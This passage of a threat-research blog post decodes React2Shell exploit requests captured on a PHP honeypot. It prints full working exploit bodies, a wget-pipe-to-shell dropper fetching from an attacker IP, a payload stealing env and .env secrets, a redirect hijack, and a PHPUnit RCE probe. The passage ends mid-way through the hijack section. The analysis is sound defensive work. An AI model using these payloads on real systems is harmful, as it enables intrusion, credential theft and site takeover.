@@ -1,0 +1,540 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>React2Shell Payloads Captured on a PHP Honeypot: Reverse Shell, Redirect Hijack, .env Theft | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/">
+<meta name="description" content="Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/">
+<meta property="og:title" content="React2Shell Payloads Captured on a PHP Honeypot: Reverse Shell, Redirect Hijack, .env Theft | Global SOC">
+<meta property="og:description" content="Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="React2Shell Payloads Captured on a PHP Honeypot: Reverse Shell, Redirect Hijack, .env Theft | Global SOC">
+<meta name="twitter:description" content="Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/#article",
+      "url": "https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/"
+      },
+      "headline": "React2Shell on a Server With No React: Seven Payloads, Decoded",
+      "description": "Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.",
+      "datePublished": "2026-11-15",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "React2Shell on a Server With No React: Seven Payloads, Decoded",
+          "item": "https://globalsoc.com.au/blog/react2shell-payloads-on-a-php-server/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-15">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 15 November 2026</p>
+<h1>React2Shell on a Server With No React: Seven Payloads, Decoded</h1>
+<p>Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.</p>
+<nav class="toc"><strong>Key Sections:</strong> Summary · How the Exploit Request Works · Scanner Checks · Dropper · Environment Theft · Redirect Hijack · Reverse Shell x 47 · What the Honeypot Answered · Packet Capture Note · IOCs · Detection (KQL) · Mitigation</nav>
+<p class="small">Part of the <a href="/blog/honeypot-24-days-of-attacks/">PHP honeypot series</a>. Data: nginx request log from <code>vm-php-cve-lab</code>, 22 October – 15 November 2026 (UTC). Payloads are shown as captured; URLs are defanged.</p>
+
+<h2>1. Summary</h2>
+<p>React2Shell is CVE-2025-55182, a remote code execution flaw in React Server Components disclosed in December 2025 with a CVSS score of 10.0. One unauthenticated POST to any page of a vulnerable Next.js App Router application runs JavaScript inside the Node.js server process.</p>
+<p>Our honeypot is Apache with PHP. It has no Node.js, no React and no Next.js. It still received 58 React2Shell requests from 11 IPs between 2026-10-22 and 2026-11-09. Every one was a <code>POST /</code>, and every one got the same static page back with status 200.</p>
+<p>That makes this a clean sample. The attackers did not fingerprint the target first; they sent the exploit to port 80 and moved on. Since nothing could execute, we kept the complete request for each of seven distinct payloads:</p>
+<table><thead><tr><th></th><th>Payload</th><th>Requests</th><th>Source IPs</th><th>First seen (UTC)</th><th>Last seen (UTC)</th><th>Sources</th></tr></thead><tbody>
+<tr><td>A</td><td>Check: echo a random marker</td><td>3</td><td>3</td><td>2026-10-22 09:51</td><td>2026-11-03 06:54</td><td>15.204.225.168, 43.173.1.89, 45.55.89.67</td></tr>
+<tr><td>B</td><td>Check: fixed marker, no command</td><td>4</td><td>4</td><td>2026-11-02 18:07</td><td>2026-11-07 06:28</td><td>204.76.203.31, 23.94.145.185, 93.152.224.190, 96.62.224.241</td></tr>
+<tr><td>C</td><td>Check: echo marker, output returned as base64</td><td>1</td><td>1</td><td>2026-10-28 15:21</td><td>2026-10-28 15:21</td><td>181.215.186.252</td></tr>
+<tr><td>D</td><td>Redirect hijack: every GET sent to another site</td><td>1</td><td>1</td><td>2026-10-22 10:38</td><td>2026-10-22 10:38</td><td>45.198.224.169</td></tr>
+<tr><td>E</td><td>Dropper: wget | sh</td><td>1</td><td>1</td><td>2026-10-30 00:26</td><td>2026-10-30 00:26</td><td>204.76.203.237</td></tr>
+<tr><td>F</td><td>Theft: id, env and .env returned as base64</td><td>1</td><td>1</td><td>2026-10-31 19:21</td><td>2026-10-31 19:21</td><td>204.76.203.31</td></tr>
+<tr><td>G</td><td>Reverse shell</td><td>47</td><td>1</td><td>2026-10-30 06:59</td><td>2026-11-09 02:19</td><td>91.92.40.12</td></tr>
+</tbody></table>
+<svg viewBox="0 0 720 174" role="img" style="width:100%;max-width:720px;height:auto;font:13px system-ui,sans-serif">
+<text x="222" y="16" text-anchor="end" fill="#1d3344">Reverse shell (G)</text><rect class="bar" x="230" y="4" width="410" height="15" rx="2"/><text x="646" y="16" fill="#47687c">47</text>
+<text x="222" y="40" text-anchor="end" fill="#1d3344">Check (B)</text><rect class="bar" x="230" y="28" width="34" height="15" rx="2"/><text x="270" y="40" fill="#47687c">4</text>
+<text x="222" y="64" text-anchor="end" fill="#1d3344">Check (A)</text><rect class="bar" x="230" y="52" width="26" height="15" rx="2"/><text x="262" y="64" fill="#47687c">3</text>
+<text x="222" y="88" text-anchor="end" fill="#1d3344">Redirect hijack (D)</text><rect class="bar" x="230" y="76" width="8" height="15" rx="2"/><text x="244" y="88" fill="#47687c">1</text>
+<text x="222" y="112" text-anchor="end" fill="#1d3344">Check (C)</text><rect class="bar" x="230" y="100" width="8" height="15" rx="2"/><text x="244" y="112" fill="#47687c">1</text>
+<text x="222" y="136" text-anchor="end" fill="#1d3344">Dropper (E)</text><rect class="bar" x="230" y="124" width="8" height="15" rx="2"/><text x="244" y="136" fill="#47687c">1</text>
+<text x="222" y="160" text-anchor="end" fill="#1d3344">Theft (F)</text><rect class="bar" x="230" y="148" width="8" height="15" rx="2"/><text x="244" y="160" fill="#47687c">1</text>
+</svg>
+
+<h2>2. How the Exploit Request Works</h2>
+<p>All seven share the same wrapper and differ only in the JavaScript they carry. Here is the simplest one in full:</p>
+<pre><code>2026-11-02 18:07:18 UTC  204.76.203.31 (The Netherlands)  status 200  request 817 bytes  response 3684 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=DUOSCANNER777;307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</code></pre>
+<p>It is a multipart form with three fields named <code>0</code>, <code>1</code> and <code>2</code>. That is the wire format React uses when a browser calls a Server Action: each field is a "chunk" of a serialised object graph, and chunks refer to each other with <code>$</code> prefixes. The server-side decoder trusted those references too much.</p>
+<table>
+<tr><th>Part of the payload</th><th>What it does</th></tr>
+<tr><td>Field <code>1</code> = <code>"$@0"</code></td><td><code>$@</code> means "give me chunk 0 itself, as the internal promise-like object", not its decoded value. This hands the attacker's JSON to code that expects a real internal Chunk.</td></tr>
+<tr><td><code>"then":"$1:__proto__:then"</code></td><td>A reference with a path. It walks from chunk 1 up to <code>__proto__</code> and takes the real <code>Chunk.prototype.then</code>. The fake object now has a genuine <code>then</code> method, so React treats it as a promise and awaits it. The decoder did not stop property paths from reaching the prototype; that is the bug.</td></tr>
+<tr><td><code>"status":"resolved_model"</code></td><td>Tells that <code>then</code> method the chunk is ready to be parsed. It parses <code>value</code> using the object in <code>_response</code> as its context, and <code>_response</code> is attacker data.</td></tr>
+<tr><td><code>"value":"{\"then\":\"$B1337\"}"</code></td><td><code>$B</code> is a Blob reference. To resolve it the decoder calls <code>_response._formData.get(_response._prefix + "1337")</code>.</td></tr>
+<tr><td><code>"_formData":{"get":"$1:constructor:constructor"}</code></td><td>Another prototype walk: the constructor of the constructor of any object is <code>Function</code>. So the call above becomes <code>Function(_prefix + "1337")</code>, which compiles the attacker's string into a function.</td></tr>
+<tr><td><code>"_prefix":"…"</code></td><td>The JavaScript to run. The decoder appends the blob id, so the code ends with a statement separator and the stray <code>1337</code> is a harmless expression. The new function is stored as a <code>then</code> property, React awaits it, and it runs.</td></tr>
+</table>
+<p>One thing is missing from our copy. A real attack also needs a <code>Next-Action</code> request header so that Next.js routes the POST to the Server Action decoder. Our nginx log format recorded the request line, User-Agent, Content-Type and body only, so that header is not shown. It would have been there.</p>
+<p><strong>Getting output back.</strong> Most payloads end by throwing an error named <code>NEXT_REDIRECT</code> with a <code>digest</code> string. Next.js uses exactly that error internally to implement <code>redirect()</code>. When it sees one, it answers with a redirect and copies the target into an <code>x-action-redirect</code> response header. The attacker puts command output into the target (<code>/login?a=&lt;output&gt;</code>) and reads it from the response header. No outbound connection is needed.</p>
+<p>The multipart boundaries are a fingerprint in their own right:</p>
+<pre><code>  54  ----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+   3  ----CveSweep&lt;8 hex&gt;
+   1  010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8</code></pre>
+<p><code>----WebKitFormBoundaryx8jO2oVc6SWP3Sad</code> is not a browser. A real browser generates a new random boundary for every request. This fixed string comes from the first public proof-of-concept and was copied, unchanged, into five of the seven payload variants seen here. Two requests (D and E) even kept the PoC's User-Agent, which names the security firm that published the original scanner. User-Agents:</p>
+<pre><code>  47  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+   8  Mozilla/5.0
+   2  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+   1  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</code></pre>
+
+<h2>3. Scanner Checks (A, B, C)</h2>
+<p><strong>B: fixed marker, runs nothing.</strong> The request in section 2. Its JavaScript is one statement:</p>
+<pre><code>throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=DUOSCANNER777;307;`});</code></pre>
+<p>(In this post each payload is shown twice: the request exactly as logged, then its <code>_prefix</code> JavaScript re-indented for reading, with no characters changed other than line breaks and indentation.)</p>
+<p>No command is executed. If the response carries <code>x-action-redirect: /login?a=DUOSCANNER777</code>, the target is vulnerable. Four IPs sent it:</p>
+<pre><code>2026-11-02 18:07:18  204.76.203.31
+2026-11-04 07:49:04  96.62.224.241
+2026-11-07 05:38:14  23.94.145.185
+2026-11-07 06:28:52  93.152.224.190</code></pre>
+<p>Each came as part of the same four-request session, a TLS handshake sent to port 80, a GET, a PHPUnit check and then this:</p>
+<pre><code>2026-11-07 06:28:51    L  H                           �  -&gt; 400  (non_http_or_malformed)
+2026-11-07 06:28:51  GET /  -&gt; 200  (root_probe)
+2026-11-07 06:28:52  POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  -&gt; 404  (phpunit_rce)
+2026-11-07 06:28:52  POST /  -&gt; 200  (react2shell)</code></pre>
+<p>The PHPUnit request in that session is the <code>PAST</code> marker check from the <a href="/blog/legacy-php-rce-still-scanned/">legacy PHP RCE post</a>:</p>
+<pre><code>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+User-Agent: Mozilla/5.0
+Content-Type: text/plain
+
+&lt;?php system('echo PAST429990; id'); ?&gt;</code></pre>
+<p>One scanner, a 2017 PHP bug and a 2025 React bug, sent in the same second.</p>
+<p><strong>A: echo a random marker.</strong></p>
+<pre><code>2026-10-22 09:51:21 UTC  15.204.225.168 (United States)  status 200  request 819 bytes  response 3684 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0
+Content-Type: multipart/form-data; boundary=----CveSweep592a539e
+
+------CveSweep592a539e
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo R2SHELL_75ed4b38bb').toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------CveSweep592a539e
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------CveSweep592a539e
+Content-Disposition: form-data; name="2"
+
+[]
+------CveSweep592a539e--
+</code></pre>
+<pre><code>var res=process.mainModule.require('child_process').execSync('echo R2SHELL_75ed4b38bb').toString().trim();
+throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});</code></pre>
+<p>This one does run a shell command, <code>echo</code>, and returns its output as the error digest. The marker and the boundary are random per target, so a reflected string cannot produce a false positive:</p>
+<pre><code>2026-10-22 09:51:21  15.204.225.168   R2SHELL_75ed4b38bb  boundary ----CveSweep592a539e
+2026-10-23 12:35:24  43.173.1.89      R2SHELL_e98375f59b  boundary ----CveSweep44092f3b
+2026-11-03 06:54:25  45.55.89.67      R2SHELL_b89e7770f1  boundary ----CveSweep82051d7b</code></pre>
+<p><strong>C: a more careful check.</strong> Sent once, as the first request of a ten-second, 79-request burst in which the rest were mostly requests for secret files.</p>
+<pre><code>2026-10-28 15:21:42 UTC  181.215.186.252 (United Arab Emirates)  status 200  request 2043 bytes  response 1941 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8
+
+--010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8
+Content-Disposition: form-data; name="0"
+
+{"_response":{"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"},"_prefix":"function rq(m){try{return process.mainModule.require(m)}catch(e){};try{return process.getBuiltinModule(m)}catch(e){};try{return module.constructor._load(m)}catch(e){};try{return require(m)}catch(e){};return null};var o='';try{o=rq('child_process').execSync('echo RECONX_R2S_OK',{encoding:'utf8',timeout:25000,maxBuffer:512000}).toString()}catch(e){o=String((e\u0026\u0026e.stdout)||'')+String((e\u0026\u0026e.stderr)||(e\u0026\u0026e.message)||e)}if(o.length\u003e700)o=o.slice(0,700)+'\\n…[truncated]';var res=Buffer.from(String(o),'utf8').toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(res)};307;`});"},"reason":-1,"status":"resolved_model","then":"$1:__proto__:then","value":"{\"then\":\"$B1337\"}"}
+--010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8
+Content-Disposition: form-data; name="1"
+
+"$@0"
+--010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8
+Content-Disposition: form-data; name="2"
+
+[]
+--010dad616a82b58f6b37c5ad86a109656682fc17a079b316686de0cd2aa8--
+</code></pre>
+<pre><code>function rq(m){
+  try{
+    return process.mainModule.require(m)
+  }catch(e){
+  };
+  try{
+    return process.getBuiltinModule(m)
+  }catch(e){
+  };
+  try{
+    return module.constructor._load(m)
+  }catch(e){
+  };
+  try{
+    return require(m)
+  }catch(e){
+  };
+  return null
+};
+var o='';
+try{
+  o=rq('child_process').execSync('echo RECONX_R2S_OK',{encoding:'utf8',timeout:25000,maxBuffer:512000}).toString()
+}catch(e){
+  o=String((e&amp;&amp;e.stdout)||'')+String((e&amp;&amp;e.stderr)||(e&amp;&amp;e.message)||e)
+}if(o.length&gt;700)o=o.slice(0,700)+'\n…[truncated]';
+var res=Buffer.from(String(o),'utf8').toString('base64');
+throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(res)};307;`});</code></pre>
+<p>It tries four ways to load <code>child_process</code> (<code>process.mainModule.require</code>, <code>process.getBuiltinModule</code>, <code>module.constructor._load</code>, plain <code>require</code>) because the first is not available in every bundling mode. Output is capped at 700 characters, base64-encoded and URL-encoded before going into the redirect, so multi-line output survives the trip through an HTTP header. The command here is only <code>echo RECONX_R2S_OK</code>, but the wrapper is built to carry any command.</p>
+
+<h2>4. Dropper (E)</h2>
+<pre><code>2026-10-30 00:26:46 UTC  204.76.203.237 (The Netherlands)  status 200  request 1203 bytes  response 1936 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('(cd /tmp; crontab -r 2&gt;/dev/null; wget hxxp://134.209.89.212/r -O- | sh) ; echo 11111').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</code></pre>
+<pre><code>var res=process.mainModule.require('child_process').execSync('(cd /tmp; crontab -r 2&gt;/dev/null; wget hxxp://134.209.89.212/r -O- | sh) ; echo 11111').toString().trim();
+throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});</code></pre>
+<p>No check first. The shell command does three things:</p>
+<ul>
+<li><code>cd /tmp</code>: a directory any user can write to.</li>
+<li><code>crontab -r</code>: deletes the current user's whole crontab. On an already-infected host that removes a competitor's persistence. On a healthy host it silently deletes the application's own scheduled jobs, which is often the first symptom an owner notices.</li>
+<li><code>wget … -O- | sh</code>: fetches a script from <code>134.209.89.212</code> and pipes it into a shell without writing it to disk.</li>
+</ul>
+<p><code>echo 11111</code> is the success marker, returned through the redirect. One second later the same IP sent <code>HEAD /</code>:</p>
+<pre><code>2026-10-30 00:26:46  POST /  -&gt; 200  (react2shell)
+2026-10-30 00:26:47  HEAD /  -&gt; 200  (root_probe)</code></pre>
+<p>We did not fetch the second stage. Nothing on the honeypot contacted that address.</p>
+
+<h2>5. Environment Theft (F)</h2>
+<pre><code>2026-10-31 19:21:24 UTC  204.76.203.31 (The Netherlands)  status 200  request 1610 bytes  response 1936 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then": "$1:__proto__:then", "status": "resolved_model", "reason": -1, "value": "{\"then\":\"$B1337\"}", "_response": {"_prefix": "var r;try{if(process.mainModule&amp;&amp;process.mainModule.require){r=process.mainModule.require('child_process').execSync('timeout 8 id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null')}else{var rr=process.binding('spawn_sync').spawn({file:'/bin/sh',args:['sh','-c','id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null'],envPairs:Object.entries(process.env).map(function(e){return e[0]+'='+e[1]}),stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]});r=Buffer.from(rr.output[1]||'')+Buffer.from(rr.output[2]||'')}}catch(e){r=''}throw Object.assign(new Error('x'),{digest:Buffer.from(String(r)).toString('base64')});", "_chunks": "$Q2", "_formData": {"get": "$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+</code></pre>
+<pre><code>var r;
+try{
+  if(process.mainModule&amp;&amp;process.mainModule.require){
+    r=process.mainModule.require('child_process').execSync('timeout 8 id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null')
+  }else{
+    var rr=process.binding('spawn_sync').spawn({file:'/bin/sh',args:['sh','-c','id; echo ===ENV===; env; echo ===E===; cat .env 2&gt;/dev/null; echo ===DOTENV===; cd /app 2&gt;/dev/null &amp;&amp; cat .env 2&gt;/dev/null'],envPairs:Object.entries(process.env).map(function(e){
+      return e[0]+'='+e[1]
+    }),stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]});
+    r=Buffer.from(rr.output[1]||'')+Buffer.from(rr.output[2]||'')
+  }
+}catch(e){
+  r=''
+}throw Object.assign(new Error('x'),{digest:Buffer.from(String(r)).toString('base64')});</code></pre>
+<p>This payload installs nothing. It wants secrets, in one round trip:</p>
+<ul>
+<li><code>id</code>: which user the app runs as.</li>
+<li><code>env</code>: the process environment. For a containerised Next.js app this is where the database URL, auth secret, payment and cloud keys live.</li>
+<li><code>cat .env</code>, then <code>cd /app &amp;&amp; cat .env</code>: the dotenv file in the working directory and in the conventional Docker path.</li>
+</ul>
+<p>The <code>===ENV===</code>-style separators let the operator's tool split the reply. The result is base64-encoded and thrown as an error digest. The <code>else</code> branch is a fallback for runtimes where <code>require</code> is unreachable: it calls Node's internal <code>process.binding('spawn_sync')</code> directly to start <code>/bin/sh</code>.</p>
+<p>The same IP came back two days later with the marker-only check from section 3:</p>
+<pre><code>2026-10-31 19:21:24  POST /  -&gt; 200  (react2shell)
+2026-11-02 18:07:17    L  H                           �  -&gt; 400  (non_http_or_malformed)
+2026-11-02 18:07:17  GET /  -&gt; 200  (root_probe)
+2026-11-02 18:07:18  POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  -&gt; 404  (phpunit_rce)
+2026-11-02 18:07:18  POST /  -&gt; 200  (react2shell)</code></pre>
+<p>Compare this with the <a href="/blog/env-git-secret-hunters/">3,291 requests for <code>/.env</code> over HTTP</a>. Blocking dotfiles at the web server stops those. It does nothing here, because this payload reads the file from inside the application.</p>
+
+<h2>6. Redirect Hijack (D)</h2>
+<pre><code>2026-10-22 10:38:12 UTC  45.198.224.169 (United States)  status 200  request 1492 bytes  response 1936 bytes
+
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(function(){var r=process.mainModule.require,u='hxxps://return.st/',h=function(m){var o=m.Server.prototype.emit;m.Server.prototype.emit=function(t){if(t==='request'){var q=arguments[1],s=arguments[2];if(q.method==='GET'||q.method==='HEAD'){s.writeHead(307,{Location:u});s.end();return true}}return o.apply(this,arguments)}};h(r('http'));try{h(r('https'))}catch(e){}})();try{process.mainModule.require('child_process').exec('echo lol')}catch(e){};var e=new Error('NEXT_REDIRECT');e.digest='NEXT_REDIRECT;replace;hxxps://return.st/;307;';throw e;","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="2"
+
+[]
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--</code></pre>
+<pre><code>(function(){
+  var r=process.mainModule.require,u='hxxps://return.st/',h=function(m){
+    var o=m.Server.prototype.emit;
+    m.Server.prototype.emit=function(t){
+      if(t==='request'){
+        var q=arguments[1],s=arguments[2];
+        if(q.method==='GET'||q.method==='HEAD'){
+          s.writeHead(307,{Location:u});
+          s.end();
+          return true
+        }
+      }return o.apply(this,arguments)
+    }
+  };
+  h(r('http'));
+  try{
+    h(r('https'))
+  }catch(e){
+  }
+})();
+try{
+  process.mainModule.require('child_process').exec('echo lol')
+}catch(e){
+};
+var e=new Error('NEXT_REDIRECT');
+e.digest='NEXT_REDIRECT;replace;hxxps://return.st/;307;';
+throw e;</code></pre>
+<p>The most unusual of the seven. It does not download anything or steal anything. It takes over the site's traffic:</p>
+<ol>
+<li>It loads Node's <code>http</code> module (and <code>https</code>, if present) and replaces <code>Server.prototype.emit</code>, the function every Node HTTP server uses to dispatch events.</li>
